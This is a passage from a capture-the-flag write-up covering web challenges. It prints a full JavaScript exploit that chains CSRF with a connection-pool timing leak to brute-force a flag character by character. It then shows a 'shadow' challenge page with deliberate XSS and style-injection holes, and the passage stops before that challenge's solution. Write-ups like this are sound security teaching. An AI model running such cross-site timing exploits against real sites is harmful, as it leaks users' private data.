    <span class="token keyword">let</span> start <span class="token operator">=</span> window<span class="token punctuation">.</span>performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>test_server_url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">let</span> end <span class="token operator">=</span> window<span class="token punctuation">.</span>performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> end <span class="token operator">-</span> start<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">fetch_sleep_long</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 40s sleep</span>
    <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>i<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">MYSERVER</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/40sleep</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">fetch_sleep_short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 0.25s sleep</span>
    <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>i<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">MYSERVER</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/ssleep</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">block_socket</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token function">fetch_sleep_long</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// needed?</span>
    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">exhaust_sockets</span> <span class="token operator">=</span> <span class="token keyword">async</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token constant">SOCKETLIMIT</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">block_socket</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Used </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>i<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> connections</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">timeit</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> popup</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">r</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>

        popup<span class="token punctuation">.</span>location <span class="token operator">=</span> url<span class="token punctuation">;</span>
        <span class="token comment">// needed?</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>

        <span class="token keyword">let</span> val <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">time_fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token function">r</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// const alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-&#125;!"#$%&amp;\'()*+,-./:;&lt;=>?@[\\]^`|~&#123;'.split('');</span>
<span class="token keyword">const</span> alphabet <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz&#125;_'</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// const alphabet = 'abcdef&#125;'.split('');</span>

<span class="token keyword">const</span> <span class="token function-variable function">oracle</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">search</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> url <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://carrot-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">INSTANCE</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.mc.ax/tasks?search=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>search<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
    <span class="token keyword">let</span> t <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">timeit</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token constant">WINBG</span><span class="token punctuation">)</span>

    <span class="token constant">LOG</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>search<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>search<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> t <span class="token operator">></span> <span class="token constant">TIMELIMIT</span> 
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">brute</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">flag</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> char <span class="token keyword">of</span> alphabet<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">oracle</span><span class="token punctuation">(</span>flag <span class="token operator">+</span> char<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> char<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">calibrate</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">r</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// slow</span>
        <span class="token keyword">let</span> url1 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://carrot-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">INSTANCE</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.mc.ax/tasks?search=dice&#123;</span><span class="token template-punctuation string">`</span></span>
        <span class="token keyword">let</span> t1 <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">timeit</span><span class="token punctuation">(</span>url1<span class="token punctuation">,</span> <span class="token constant">WINBG</span><span class="token punctuation">)</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">slow:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
        <span class="token comment">// fast</span>
        <span class="token keyword">let</span> url2 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://carrot-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">INSTANCE</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.mc.ax/tasks?search=XXXXXXXXXX</span><span class="token template-punctuation string">`</span></span>
        <span class="token keyword">let</span> t2 <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">timeit</span><span class="token punctuation">(</span>url2<span class="token punctuation">,</span> <span class="token constant">WINBG</span><span class="token punctuation">)</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">fast:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token function">r</span><span class="token punctuation">(</span><span class="token punctuation">(</span>t1 <span class="token operator">+</span> t2<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> exploit <span class="token operator">=</span> <span class="token keyword">async</span><span class="token punctuation">(</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Starting'</span><span class="token punctuation">)</span>
    <span class="token comment">// dont go to fast plz :) </span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">waiting 3s</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span>
    <span class="token comment">// exaust sockets</span>
    <span class="token keyword">await</span> <span class="token function">exhaust_sockets</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>
    <span class="token constant">LOG</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Calibrating</span><span class="token template-punctuation string">`</span></span>
    <span class="token constant">TIMELIMIT</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">calibrate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token constant">LOG</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">TIMELIMIT:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">TIMELIMIT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">timelimit:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">TIMELIMIT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> last<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        last <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">brute</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>last <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> flag<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> 
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            flag <span class="token operator">+=</span> last<span class="token punctuation">;</span>
            output<span class="token punctuation">.</span>innerText <span class="token operator">=</span> flag<span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>last <span class="token operator">===</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> flag
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">popunder</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>opener<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token constant">WINBG</span> <span class="token operator">=</span> window<span class="token punctuation">.</span>opener
    <span class="token punctuation">&#125;</span> 
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token constant">WINBG</span> <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>href<span class="token punctuation">,</span> target<span class="token operator">=</span><span class="token string">"_blank"</span><span class="token punctuation">)</span>
        location <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">about:blank</span><span class="token template-punctuation string">`</span></span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">csrf</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    x<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://carrot-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">INSTANCE</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.mc.ax/edit/0</span><span class="token template-punctuation string">`</span></span>
    x<span class="token punctuation">.</span>title<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"A"</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span>
    x<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>p<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">no INSTANCE</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">&#125;</span>
    <span class="token constant">INSTANCE</span> <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span>
    <span class="token comment">// step 1 </span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string">'csrf'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// step 2</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string">'exploit'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// window open is ok in headless :)</span>
        <span class="token function">popunder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        
        <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token string">'dice&#123;'</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>In short, you can first use CSRF to change the title of the admin note to a super long string. Because jinja2 render will slow down, the response time will increase.</p>
<p>Then it is a timing attack. The exploit above uses <a target="_blank" rel="noopener" href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/">connection pool</a>. First, stuff the browser’s connection pool with only one left, and then use a new window to visit the search URL (let’s call it reqSearch). At the same time, send a request to our own server (we call it reqMeasure). Because only one connection can be used, the time from sending the request to receiving the response of reqMeasure is the time spent by reqSearch + the time spent by reqMeasure. Assuming that the time spent by reqMeasure is similar, we can easily measure the time spent by reqSearch.</p>
<p>After measuring the time, you can slowly brute force the content of the flag.</p>
<h2><span id="webx2fshadow0-solves">web&#x2F;shadow(0 solves)</span></h2><p>This is a pure front-end problem. Let’s take a look at the code:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>shadow<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>store your secrets here:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>vault<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xss<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
      <span class="token comment">// the admin has the flag set in localStorage["secret"]</span>
      <span class="token keyword">let</span> secret <span class="token operator">=</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">"secret"</span><span class="token punctuation">)</span> <span class="token operator">??</span> <span class="token string">"dice&#123;not_real_flag&#125;"</span>
      <span class="token keyword">let</span> shadow <span class="token operator">=</span> window<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">attachShadow</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">"closed"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      div<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
          &lt;p>steal me :)&lt;/p>
          &lt;!-- secret: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>secret<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> -->
      </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">;</span>
      <span class="token keyword">let</span> x <span class="token operator">=</span> params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> y <span class="token operator">=</span> params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"y"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      div<span class="token punctuation">.</span>style <span class="token operator">=</span> y<span class="token punctuation">;</span>
      shadow<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>div<span class="token punctuation">)</span><span class="token punctuation">;</span>
      secret <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
      localStorage<span class="token punctuation">.</span><span class="token function">removeItem</span><span class="token punctuation">(</span><span class="token string">"secret"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      shadow <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
      div <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
      
      <span class="token comment">// free XSS</span>
      window<span class="token punctuation">.</span>xss<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> x<span class="token punctuation">;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
  

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>A closed shadow DOM is created, and you are asked to find a way to access the content inside. According to <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Element/attachShadow#parameters">MDN</a>, closed means:</p>
<blockquote>
<p>closed: Denies access to the node(s) of a closed shadow root from JavaScript outside it:</p>
</blockquote>
<p>So JavaScript cannot directly access the code, and no matter how you query, it will be null.</p>
<p>Therefore, the key to this question is a deliberately left style injection: <code>div.style = y;</code>, and you can add some CSS.</p>
